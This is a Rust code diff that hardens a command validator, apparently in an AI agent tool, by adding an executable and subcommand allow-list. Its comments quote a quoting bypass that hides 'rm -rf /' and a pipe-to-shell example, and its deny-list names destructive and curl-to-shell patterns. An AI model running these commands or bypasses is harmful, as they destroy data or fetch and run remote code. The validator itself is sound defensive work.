@@ -1668,18 +1668,103 @@ fn validate_command(cmd: &str) -> Result<(), String> {
     if exe.chars().any(|c| c.is_control()) {
         return Err("Command rejected: control character in executable name".into());
     }
-    // Exact-identity rule: the executable token is the full first parsed
-    // word. We do not accept substring matches. This is the key change
-    // from the prior substring-only implementation.
+    // ── Layer 2: positive ALLOWLIST on the executable identity (SB-7) ──
     //
-    // NOTE: this function is a defence-in-depth backstop and does not
-    // itself own the allow-list of which executables may run — that
-    // responsibility lives in the daemon-side sanitizer. We ONLY reject
-    // obviously-invalid identity shapes here.
+    // Pre-SB-7 (Wave 6.5-XX) this layer was a substring deny-list, which
+    // was attackable via clever quoting. The classic bypass was
+    //   `bash -c "$(printf 'rm\x20-rf\x20/')"`
+    // because the literal substring "rm -rf /" never appeared in the raw
+    // command — it only materialized after the inner `printf` ran inside
+    // the shell. The deny-list never matched and the command sailed
+    // through to the shell.
+    //
+    // The fix is a positive allow-list: the executable identity (the
+    // basename of `tokens[0]`) must appear in EXEC_ALLOWLIST. Anything
+    // else — including `bash`, `sh`, `zsh`, `python`, `node`, `eval`,
+    // `exec`, and absolute paths to anything not in the list — is
+    // rejected. Daemon-side sanitization (src/security/command-sanitizer.ts)
+    // owns the higher-fidelity check; this Rust backstop is the last
+    // line of defence when execute_command is invoked directly.
+    //
+    // For the `wotann` binary specifically, we additionally enforce a
+    // SUBCOMMAND allow-list so a future `wotann eval-skill <file>` can't
+    // be added without an explicit decision here.
+    //
+    // QB#6: fail-CLOSED — anything not in the list is rejected with an
+    // explicit denial reason, not silently allowed.
+    const EXEC_ALLOWLIST: &[&str] = &[
+        // Read-only inspection
+        "ls", "cat", "head", "tail", "less", "more", "wc", "stat",
+        "file", "tree", "pwd", "echo", "printf", "true", "false",
+        // Search
+        "grep", "egrep", "fgrep", "rg", "ripgrep", "find", "ag", "fd",
+        // VCS
+        "git", "hg",
+        // Build / language tooling
+        "npm", "npx", "yarn", "pnpm", "bun",
+        "cargo", "rustc", "rustup",
+        "go", "gofmt",
+        "python", "python3", "pip", "pip3",
+        "node", "deno",
+        "make", "cmake", "ninja",
+        "tsc", "vitest", "jest", "eslint", "prettier",
+        // Project-internal
+        "wotann",
+        // Filesystem (constrained — no `rm`, no `mv`, no `chmod`)
+        "mkdir", "touch", "cp", "ln",
+        // Misc safe utilities
+        "date", "uname", "which", "whoami", "env", "id",
+        "diff", "patch",
+        "sort", "uniq", "cut", "awk", "sed", "tr",
+        "xargs", "tee",
+    ];
 
-    // ── Layer 2: dangerous-pattern blocklist applied to the RAW string ──
-    // Kept as defence-in-depth for payloads that somehow slip past the
-    // shell parse (e.g. within a single quoted argument to `bash -c`).
+    // Subcommand allow-list specifically for `wotann <subcommand>`.
+    // Anything outside this list is rejected even though `wotann` itself
+    // is allowed. Mirrors the user-facing CLI in CLAUDE.md.
+    const WOTANN_SUBCOMMAND_ALLOWLIST: &[&str] = &[
+        "start", "init", "build", "compare", "review", "engine",
+        "relay", "workshop", "link", "autopilot", "enhance",
+        "skills", "memory", "cost", "voice", "schedule", "channels",
+        "trust", "untrust", "doctor", "guard", "version", "--version",
+        "--help", "-h", "help",
+    ];
+
+    // Resolve the executable identity to its basename so absolute paths
+    // (`/usr/bin/git`) and bare names (`git`) compare equal. We reject
+    // anything with a NUL byte / control char already; basename is just
+    // "everything after the last slash".
+    let exe_basename = exe.rsplit('/').next().unwrap_or(exe);
+    if !EXEC_ALLOWLIST.iter().any(|allowed| *allowed == exe_basename) {
+        return Err(format!(
+            "Command rejected: executable '{}' not in allow-list (SB-7). \
+             Allowed: {} known-safe binaries (ls, cat, grep, git, npm, cargo, wotann, ...). \
+             To run an arbitrary command, route through the daemon's authorized 'execute' RPC.",
+            exe_basename,
+            EXEC_ALLOWLIST.len(),
+        ));
+    }
+
+    // For `wotann <sub>`, enforce the subcommand allow-list.
+    if exe_basename == "wotann" && tokens.len() > 1 {
+        let sub = &tokens[1];
+        if !WOTANN_SUBCOMMAND_ALLOWLIST.iter().any(|allowed| *allowed == sub.as_str()) {
+            return Err(format!(
+                "Command rejected: 'wotann {}' subcommand not in allow-list (SB-7). \
+                 Allowed subcommands: {}.",
+                sub,
+                WOTANN_SUBCOMMAND_ALLOWLIST.join(", "),
+            ));
+        }
+    }
+
+    // ── Layer 3: dangerous-pattern blocklist applied to the RAW string ──
+    // Defence-in-depth: even though the allow-list above blocks bash/sh,
+    // we still scan the raw command for sensitive substrings. This catches
+    // payloads where an allow-listed binary is called with a dangerous
+    // argument (e.g. `git clone https://attacker | sh` would already fail
+    // at Layer 1, but a creative payload that survives parsing must still
+    // pass these checks).
     let dangerous_patterns = [
         "rm -rf /",
         "rm -rf ~",
@@ -1694,9 +1779,7 @@ fn validate_command(cmd: &str) -> Result<(), String> {
         // Fork bomb signature
         ":(){:|:&};:",
         ":() { :|:& };:",
-        // Pipe-to-shell payloads (belt-and-braces: the shell-meta check
-        // above already rejects `|`, but a `bash -c 'curl|sh'` payload
-        // would put the pipe inside a quoted argument and escape layer 1)
+        // Pipe-to-shell payloads (belt-and-braces)
         "curl | sh",
         "curl|sh",
         "curl | bash",
@@ -1722,7 +1805,10 @@ fn validate_command(cmd: &str) -> Result<(), String> {
     let lower = cmd.to_lowercase();
     for pattern in &dangerous_patterns {
         if lower.contains(&pattern.to_lowercase()) {
-            return Err(format!("Command rejected: contains dangerous pattern '{}'", pattern));
+            return Err(format!(
+                "Command rejected: contains dangerous pattern '{}' (SB-7 layer 3 deny-list)",
+                pattern
+            ));
         }
     }
 
@@ -1740,7 +1826,7 @@ fn validate_command(cmd: &str) -> Result<(), String> {
         // Only flag if it looks like an env assignment (not just referencing)
         if lower.contains(&pattern.to_lowercase()) {
             return Err(format!(
-                "Command rejected: modifying environment variable '{}'",
+                "Command rejected: modifying environment variable '{}' (SB-7)",
                 pattern.split('=').next().unwrap_or(pattern)
             ));
         }
